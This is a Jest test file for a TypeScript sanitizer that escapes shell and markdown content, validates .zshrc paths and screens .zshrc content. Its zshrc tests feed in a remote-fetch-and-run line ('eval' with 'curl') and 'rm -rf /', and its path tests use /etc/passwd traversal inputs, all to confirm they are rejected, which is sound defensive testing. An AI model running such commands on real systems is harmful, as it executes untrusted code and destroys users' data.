import {
  sanitizeMarkdown,
  escapeShellContent,
  validateFilePath,
  validateFileSize,
  truncateContent,
  validateZshrcContent,
} from "../utils/sanitize";
import { FILE_CONSTANTS } from "../constants";
import { homedir } from "node:os";

describe("sanitize.ts", () => {
  describe("sanitizeMarkdown", () => {
    it("should escape backticks", () => {
      const content = "This has `backticks` in it";
      const result = sanitizeMarkdown(content);
      expect(result).toBe("This has \\\\`backticks\\\\` in it");
    });

    it("should escape dollar signs", () => {
      const content = "This has $variables in it";
      const result = sanitizeMarkdown(content);
      expect(result).toBe("This has \\\\$variables in it");
    });

    it("should escape backslashes", () => {
      const content = "This has \\backslashes in it";
      const result = sanitizeMarkdown(content);
      expect(result).toBe("This has \\\\backslashes in it");
    });

    it("should handle multiple special characters", () => {
      const content = "This has `backticks`, $variables, and \\backslashes";
      const result = sanitizeMarkdown(content);
      expect(result).toBe("This has \\\\`backticks\\\\`, \\\\$variables, and \\\\backslashes");
    });

    it("should handle empty content", () => {
      const result = sanitizeMarkdown("");
      expect(result).toBe("");
    });

    it("should handle content with no special characters", () => {
      const content = "This is normal content";
      const result = sanitizeMarkdown(content);
      expect(result).toBe("This is normal content");
    });
  });

  describe("escapeShellContent", () => {
    it("should escape all shell special characters", () => {
      const content = "This has `backticks`, $variables, \\backslashes, \"quotes\", and 'apostrophes'";
      const result = escapeShellContent(content);
      expect(result).toBe(
        "This has \\\\`backticks\\\\`, \\\\$variables, \\\\backslashes, \\\"quotes\\\", and \\'apostrophes\\'",
      );
    });

    it("should handle empty content", () => {
      const result = escapeShellContent("");
      expect(result).toBe("");
    });

    it("should handle content with no special characters", () => {
      const content = "This is normal content";
      const result = escapeShellContent(content);
      expect(result).toBe("This is normal content");
    });
  });

  describe("validateFilePath", () => {
    it("should return true for valid file paths", async () => {
      // Only the exact .zshrc path in home directory should be valid
      expect(await validateFilePath(`${homedir()}/.zshrc`)).toBe(true);
      expect(await validateFilePath("~/.zshrc")).toBe(false); // Contains ~
      expect(await validateFilePath("./zshrc")).toBe(false); // Not the exact path
      expect(await validateFilePath("zshrc")).toBe(false); // Not the exact path
    });

    it("should return false for path traversal attempts", async () => {
      expect(await validateFilePath("../zshrc")).toBe(false);
      expect(await validateFilePath("../../zshrc")).toBe(false);
      expect(await validateFilePath("/Users/../etc/passwd")).toBe(false);
    });

    it("should return false for paths containing ~", async () => {
      expect(await validateFilePath("~/.zshrc")).toBe(false);
      expect(await validateFilePath("/Users/test/~/.zshrc")).toBe(false);
    });

    it("should return false for absolute paths outside home directory", async () => {
      expect(await validateFilePath("/etc/passwd")).toBe(false);
      expect(await validateFilePath("/var/log/system.log")).toBe(false);
      expect(await validateFilePath("/tmp/file")).toBe(false);
    });

    it("should return true for absolute paths in home directory", async () => {
      // Only the exact .zshrc path in home directory should be valid
      expect(await validateFilePath(`${homedir()}/.zshrc`)).toBe(true);
      expect(await validateFilePath("/Users/username/.zshrc")).toBe(false); // Not the current user's home
    });

    it("should return false for paths containing null bytes", async () => {
      expect(await validateFilePath("/Users/test/.zshrc\0")).toBe(false);
      expect(await validateFilePath("file\0name")).toBe(false);
    });

    it("should handle empty path", async () => {
      expect(await validateFilePath("")).toBe(false); // Empty path is not valid
    });
  });

  describe("validateFileSize", () => {
    it("should return true for files within size limit", () => {
      expect(validateFileSize(1000)).toBe(true);
      expect(validateFileSize(FILE_CONSTANTS.MAX_FILE_SIZE)).toBe(true);
      expect(validateFileSize(0)).toBe(true);
    });

    it("should return false for files exceeding size limit", () => {
      expect(validateFileSize(FILE_CONSTANTS.MAX_FILE_SIZE + 1)).toBe(false);
      expect(validateFileSize(FILE_CONSTANTS.MAX_FILE_SIZE * 2)).toBe(false);
    });

    it("should handle negative file sizes", () => {
      expect(validateFileSize(-1)).toBe(true); // Negative sizes are considered valid
    });
  });

  describe("truncateContent", () => {
    it("should return content unchanged if within limit", () => {
      const content = "Short content";
      const result = truncateContent(content, 100);
      expect(result).toBe("Short content");
    });

    it("should truncate content exceeding limit", () => {
      const content = "A".repeat(1000);
      const result = truncateContent(content, 100);
      expect(result).toBe("A".repeat(100) + "\n... (truncated)");
    });

    it("should use default max length", () => {
      const content = "A".repeat(20000);
      const result = truncateContent(content);
      expect(result).toBe("A".repeat(10000) + "\n... (truncated)");
    });

    it("should handle empty content", () => {
      const result = truncateContent("");
      expect(result).toBe("");
    });

    it("should handle content exactly at limit", () => {
      const content = "A".repeat(100);
      const result = truncateContent(content, 100);
      expect(result).toBe("A".repeat(100));
    });
  });

  describe("validateZshrcContent", () => {
    it("should return valid for normal content", () => {
      const content = `export PATH=/usr/local/bin:$PATH
alias ll='ls -la'
alias py='python3'`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual([]);
    });

    it("should detect long lines", () => {
      const longLine = "A".repeat(1001);
      const content = `export PATH=/usr/local/bin:$PATH
${longLine}
alias ll='ls -la'`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain("Line 2 is too long (1001 characters)");
    });

    it("should detect suspicious eval with curl pattern", () => {
      const content = `export PATH=/usr/local/bin:$PATH
eval "$(curl -s https://example.com/script.sh)"
alias ll='ls -la'`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain("Suspicious pattern detected: eval with curl");
    });

    it("should detect dangerous rm -rf / command", () => {
      const content = `export PATH=/usr/local/bin:$PATH
rm -rf /
alias ll='ls -la'`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(false);
      expect(result.errors).toContain("Dangerous command detected: rm -rf /");
    });

    it("should detect multiple issues", () => {
      const longLine = "A".repeat(1001);
      const content = `${longLine}
eval "$(curl -s https://example.com/script.sh)"
rm -rf /`;

      const result = validateZshrcContent(content);

      expect(result.isValid).toBe(false);
      expect(result.errors).toHaveLength(3);
      expect(result.errors).toContain("Line 1 is too long (1001 characters)");
      expect(result.errors).toContain("Suspicious pattern detected: eval with curl");
      expect(result.errors).toContain("Dangerous command detected: rm -rf /");
    });

    it("should handle empty content", () => {
      const result = validateZshrcContent("");
      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual([]);
    });

    it("should handle content with only newlines", () => {
      const content = "\n\n\n";
      const result = validateZshrcContent(content);
      expect(result.isValid).toBe(true);
      expect(result.errors).toEqual([]);
    });
  });
});
